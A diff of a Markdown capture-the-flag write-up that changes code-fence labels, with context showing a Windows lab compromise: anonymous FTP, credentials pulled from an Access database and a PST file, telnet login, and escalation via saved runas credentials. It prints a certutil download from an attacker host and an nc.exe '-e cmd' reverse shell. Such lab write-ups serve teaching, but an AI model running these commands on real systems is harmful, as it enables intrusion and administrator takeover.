@@ -7,11 +7,11 @@ tags: [ctf]
 --- 
 
 ## Initial Enumeration
-``` shell - Attacker (Bash)
+``` zsh
 $ sudo nmap -sC -sV -vv --top-ports=5000 $TARGETIP -oN nmapout
 ```
 
-``` shell - Attacker (Bash)
+``` zsh
 PORT   STATE SERVICE REASON          VERSION
 21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
@@ -39,12 +39,12 @@ Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:mi
 
 ### FTP
 FTP is found to be open to anonymous access (anonymous / anypasswordcanbeused). 
-``` shell - Attacker (Bash)
+``` zsh
 $ ftp $TARGETIP
 ```
 
 Within the FTP service, two folders are available with a single file in each.
-``` shell - Attacker (Bash)
+``` zsh
 125 Data connection already open; Transfer starting.
 08-23-18  09:16PM       <DIR>          Backups
 08-24-18  10:00PM       <DIR>          Engineer
@@ -72,7 +72,7 @@ Navigating to the web application on port 80, we can see a still image
 
 Let's download the files we found earlier on the FTP server. To ensure the file is not corrupted during the download, we can use the **binary on** command within FTP.
 
-``` shell - Attacker (Bash)
+``` zsh
 125 Data connection already open; Transfer starting.
 08-23-18  09:16PM              5652480 backup.mdb
 226 Transfer complete.
@@ -97,14 +97,14 @@ mget Access Control.zip [anpqy?]? y
 ```
 
 Attempting to unzip the Access Control.zip file with the standard unzip command fails:
-``` shell - Attacker (Bash)
+``` zsh
 $ unzip Access\ Control.zip 
 Archive:  Access Control.zip
    skipping: Access Control.pst      unsupported compression method 99
 ```
 
 Using the 7z tool, it is revealed that the zip archive is password protected:
-``` shell - Attacker (Bash)
+``` zsh
 $ 7z e Access\ Control.zip 
 
 7-Zip 26.00 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-02-12
@@ -124,19 +124,19 @@ Enter password (will not be echoed):
 ```
 
 Since we don't have any passwords currently, let's pivot to the *backup.mdb* file. Being unfamiliar with the extension, we investigate what file type this is:
-``` shell - Attacker (Bash)
+``` zsh
 $ file backup.mdb          
 backup.mdb: Microsoft Access Database
 ```
 
 With a quick search, we find that with the [mdbtools](https://www.kali.org/tools/mdbtools/) suite, these files can be read. Using some bash magic, we can dump all the tables into JSON output:
 
-``` shell - Attacker (Bash)
+``` zsh
 $ for line in $(mdb-tables backup.mdb -1); do echo "TABLE: ${line}" ; mdb-json backup.mdb $line; done
 ```
 
 Parsing through the output, we find credentials for an admin user:
-``` shell - Attacker (Bash)
+``` zsh
 TABLE: auth_user
 {"id":25,"username":"admin","password":"admin","Status":1,"last_login":"08/23/18 21:11:47","RoleID":26}
 {"id":27,"username":"engineer","password":"access4u@security","Status":1,"last_login":"08/23/18 21:13:36","RoleID":26}
@@ -145,7 +145,7 @@ TABLE: auth_user
 
 Since we found the *Access Control.zip* file within the Engineer folder, let's try the password for the engineer user to decrypt the file.
 
-``` shell - Attacker (Bash)
+``` zsh
 Enter password (will not be echoed):
 Everything is Ok
 
@@ -154,7 +154,7 @@ Compressed: 10870
 ```
 
 This was successful, leaving us with a single file *Access Control.pst*.
-``` shell - Attacker (Bash)
+``` zsh
 $ file Access\ Control.pst 
 Access Control.pst: Microsoft Outlook Personal Storage (>=2003, Unicode, version 23), dwReserved1=0x234, dwReserved2=0x22f3a, bidUnused=0000000000000000, dwUnique=0x39, 271360 bytes, bCryptMethod=1, CRC32 0x744a1e2e
 ```
@@ -166,7 +166,7 @@ From Microsoft's documentation we can see this file type can contain various out
 {: .prompt-info }
 
 This file can be read with the [pst-utils](https://www.kali.org/tools/mdbtools/) tool suite. We will use the **readpst** tool specifically.
-``` shell - Attacker (Bash)
+``` zsh
 $ readpst Access\ Control.pst 
 Opening PST file and indexes...
 Processing Folder "Deleted Items"
@@ -174,7 +174,7 @@ Processing Folder "Deleted Items"
 ```
 
 This results in a file created with the .mbox extension, which is text based and can be read easily in the CLI.
-``` shell - Attacker (Bash)
+``` zsh
 $ cat Access\ Control.mbox 
 From "john@megacorp.com" Thu Aug 23 19:44:07 2018
 Status: RO
@@ -195,7 +195,7 @@ The password for the “security” account has been changed to 4Cc3ssC0ntr0ller
 
 With our credentials for the security account, we can now attempt to authenticate to the telnet service.
 
-``` shell - Attacker (Bash)
+``` zsh
 $ telnet $TARGETIP         
 Trying $TARGETIP...
 Connected to $TARGETIP.
@@ -212,7 +212,7 @@ C:\Users\security>
 ```
 
 We have now logged into the machine succesfully. We are then able to navigate to the Desktop of the security user, and retrieve our **user.txt** flag.
-``` shell - Target
+```
 C:\Users\security>cd Desktop
 
 C:\Users\security\Desktop>dir
@@ -231,7 +231,7 @@ C:\Users\security\Desktop>dir
 ## Escalation to Admin
 
 Navigating back a directory, we are able to see what other users are present on the machine.
-``` shell - Target
+```
 C:\Users>dir
  Volume in drive C has no label.
  Volume Serial Number is 8164-DB5F
@@ -248,7 +248,7 @@ C:\Users>dir
 ```
 
 With no other users besides the Administrator, we can investigate if any files are available in the Public folder. We can use the */a* flag to show any hidden files.
-``` shell - Target (CMD) Telnet
+```
 C:\Users\Public>dir /a
  Volume in drive C has no label.
  Volume Serial Number is 8164-DB5F
@@ -271,7 +271,7 @@ C:\Users\Public>dir /a
 ```
 
 It seems like the Desktop folder is the only one with a more recent modification date, so we will dive deeper there.
-``` shell - Target (CMD) Telnet
+```
 C:\Users\Public\Desktop>dir /a
  Volume in drive C has no label.
  Volume Serial Number is 8164-DB5F
@@ -287,7 +287,7 @@ C:\Users\Public\Desktop>dir /a
 ```
 
 A link is found, to see what exactly it is doing, we can just print the .lnk contents with **type**:
-``` shell - Target (CMD) Telnet
+```
 C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
 L�F�@ ��7���7���#�P/P�O� �:i�+00�/C:\R1M�:Windows���:�▒M�:*wWindowsV1MV�System32���:�▒MV�*�System32▒X2P�:�
                                                                                                            runas.exe���:1��:1�*Yrunas.exe▒L-K��E�C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�
@@ -299,12 +299,12 @@ L�F�@ ��7���7���#�P/P�O� �:i�+00�/C:\R1M�:Wind
 ```
 
 While we *can* just attempt to parse the readable information from this binary file type, tool suites such as **liblnk-utils** will allow us to better interpret this shortcut file:
-``` shell - Attacker (Bash)
+``` zsh
 $ sudo apt install liblnk-utils -y
 ```
 
 We will also need to get this file onto our attacker machine. Since we are limited to CMD currently, we can use the **certutil** command to encode the file to base64, and do a simple copy and paste.
-``` shell - Target (CMD) Telnet
+```
 C:\Users\Public\Desktop>certutil -encode "ZKAccess3.5 Security System.lnk" C:\Users\security\output.txt && type C:\Users\security\output.txt
 Input Length = 1870
 Output Length = 2630
@@ -353,7 +353,7 @@ NgAyADgALQA2ADMANAA0ADYAMgA1ADYALQA1ADAAMAAAAAAAAAAAAAAAAAAAAA==
 ```
 
 This can then be converted back to the .lnk file on our attacker machine, after removing the BEGIN and END certificate lines:
-``` shell - Attacker (Bash)
+``` zsh
 $ echo -n 'TAAAAAEUAgAAAAAAwAAAAAAAAEb7QAAAIAAAAPV/wTcRBMoB9X/BNxEEygGg0wjv
 IwTKAQBQAAAAAAAAAQAAAAAAAAAAAAAAAAAAAC8BFAAfUOBP0CDqOmkQotgIACsw
 MJ0ZAC9DOlwAAAAAAAAAAAAAAAAAAAAAAAAAUgAxAAAAAAAWTec6EABXaW5kb3dz
@@ -396,17 +396,17 @@ NgAyADgALQA2ADMANAA0ADYAMgA1ADYALQA1ADAAMAAAAAAAAAAAAAAAAAAAAA==' | base64 -d > 
 ```
 
 It can now be analyzed with the **lnkinfo** command:
-``` shell - Attacker (Bash)
+``` zsh
 $ lnkinfo outlink.lnk 
 ```
 
 It contains quite a bit of output, but the Command line arguments are what we want to see specifically:
-``` shell - Attacker (Bash)
+``` zsh
 Command line arguments          : /user:ACCESS\\Administrator /savecred "C:\\ZKTeco\\ZKAccess3.5\\Access.exe"
 ```
 
 It is revealed that the **runas** command was used as the **Administrator** user with the **/savecred** option. This means the Administrator password is saved in the Windows Credential Manager, allowing for the command to be run without having to re-enter the password. We can verify the credential still exists on the machine with the **cmdkey** command:
-``` shell - Target
+```
 C:\Users\Public\Desktop>cmdkey /list
 
 Currently stored credentials:
@@ -420,34 +420,34 @@ Currently stored credentials:
 With confirmation the credential is indeed present, we can now leverage this to create a reverse shell to our attacker machine as the Administrator by leveraging the same option in a malicious runas command.
 
 We will download a Netcat executable to the machine, and create a reverse shell using the **-e** flag. First we have to get our hands on the **nc.exe**:
-``` shell - Attacker (Bash)
+``` zsh
 $ git clone https://github.com/int0x33/nc.exe/ && cd nc.exe
 ```
 
 We then need to serve this file to the machine, which can be done by setting up a simple python HTTP server, and leveraging the **certutil** command again:
-``` shell - Attacker (Bash)
+``` zsh
 $ python -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
 In our telnet session:
-``` shell - Target (CMD) Telnet
+```
 C:\Users\security> certutil -urlcache -split -f http://$ATTACKERIP/nc.exe C:\Users\security\nc.exe
 ```
 
 Now finally, we can setup the reverse shell listener:
-``` shell - Attacker (Bash)
+``` zsh
 $ nc -lvnp 8888
 listening on [any] 8888 ...
 ```
 
 And create the connection back to our attacker machine:
-``` shell - Target (CMD) Telnet
+```
 C:\Users\security>C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Users\security\nc.exe $ATTACKERIP 8888 -e cmd"
 ```
 
 We quickly receive a connection on our listener:
-``` shell - Attacker (Bash) - Netcat
+``` zsh
 connect to [$ATTACKERIP] from (UNKNOWN) [$TARGETIP] 49170
 Microsoft Windows [Version 6.1.7600]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
@@ -458,7 +458,7 @@ access\administrator
 ```
 
 We can now navigate to the Administrator's desktop and retrieve our **root.txt** flag:
-``` shell - Attacker (Bash) - Netcat
+```
 C:\Windows\system32>cd C:\Users\Administrator\Desktop
 cd C:\Users\Administrator\Desktop
 
